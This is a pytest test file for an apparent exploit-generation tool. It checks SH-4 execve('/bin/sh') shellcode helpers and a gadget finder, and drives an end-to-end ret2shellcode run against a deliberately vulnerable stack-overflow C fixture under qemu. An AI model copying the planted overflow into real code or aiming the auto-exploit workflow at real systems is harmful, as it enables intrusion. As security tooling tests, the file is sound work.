"""Cross-architecture ret2shellcode on SuperH SH-4: inject execve("/bin/sh") shellcode into an
execstack overflow and run it under qemu-user. The SH `jmp <reg>` is `jmp @rN` (a delayed branch),
so the fixture carries a `jmp @r2 ; nop` gadget and leaves r2 (a caller-saved register the epilogue
does not restore) pointing at the buffer. Fills the doc-49 5a hole: SH-4 was ret2libc-only (no
shellcode stub)."""
import shutil
import subprocess

import pytest
from lykos.analyze.poc import rop, shellcode

_SH_GCC = shutil.which("sh4-linux-gnu-gcc")
_SH_QEMU = shutil.which("qemu-sh4") or shutil.which("qemu-sh4-static")


def test_execve_binsh_sh4_shape():
    sc = shellcode.execve_binsh_sh4()
    assert len(sc) == 20 and sc.endswith(b"/bin/sh\x00")
    assert sc[:2] == bytes.fromhex("02c7")                # mova binsh, r0


def test_write_marker_sh4_patches_length():
    sc = shellcode.write_marker_sh4(b"ZOK")               # 3-byte marker
    assert sc.endswith(b"ZOK") and len(sc) == 20 + 3
    # the length lands in the `mov #len, r6` immediate byte at code offset 6
    assert sc[6] == 3


def test_find_br_gadgets_sh4():
    seg = (0x422B).to_bytes(2, "little")                  # jmp @r2
    orig = rop._loads
    rop._loads = lambda data: [(0, len(seg), 0x400100, 1)]
    try:
        g = rop.find_br_gadgets_sh4(seg)
    finally:
        rop._loads = orig
    assert any(x["reg"] == "r2" and x["va"] == 0x400100 and x["insn"] == "jmp" for x in g)


@pytest.mark.skipif(not (_SH_GCC and _SH_QEMU),
                    reason="needs sh4-linux-gnu-gcc + qemu-sh4")
def test_auto_files_l3_sh4_ret2shellcode(store, tmp_path):
    """strategy=auto drives a SuperH SH-4 execstack overflow with a `jmp @r2` gadget (r2 left
    pointing at the buffer) to a confirmed L3: injected execve("/bin/sh") shellcode runs under
    qemu-user and spawns a real shell (or writes a marker), the redirect recovered with no leak."""
    from lykos.analyze import register
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    src = tmp_path / "v.c"
    src.write_text(
        '#include <unistd.h>\n#include <stdio.h>\n'
        '__asm__(".text\\n.globl g\\ng:\\n jmp @r2\\n nop\\n");\n'        # jmp @r2 (delayed), nop slot
        'void vuln(void){ char b[256]; read(0,b,1024);'
        ' __asm__ volatile("mov %0, r2"::"r"(b):"r2"); }\n'             # r2 = &b, last before ret
        'int main(void){ setbuf(stdout,0); vuln(); return 0; }\n')
    exe = tmp_path / "v"
    if subprocess.run([_SH_GCC, "-O0", "-fno-stack-protector", "-no-pie", "-static",
                       "-z", "execstack", "-w", str(src), "-o", str(exe)],
                      capture_output=True).returncode:
        pytest.skip("cannot build sh4 execstack fixture")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, store.cases.create("sh4sc").id, exe, filename="v")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True)
        assert pool.wait_idle(180)
        assert (store.targets.get(t.id).mitigations or {}).get("nx") == "off"   # execstack
        run = enqueue_exploit(q, t, params={"strategy": "auto"})
        assert pool.wait_idle(400) and q.runs.get(run.id).status == "done"
    finally:
        pool.stop(grace=3.0)
    l3 = [pc for pc in PocDAO(store.conn).list_by_target(t.id) if pc.level == "L3" and pc.verified]
    assert l3, "no confirmed L3 sh4 ret2shellcode"
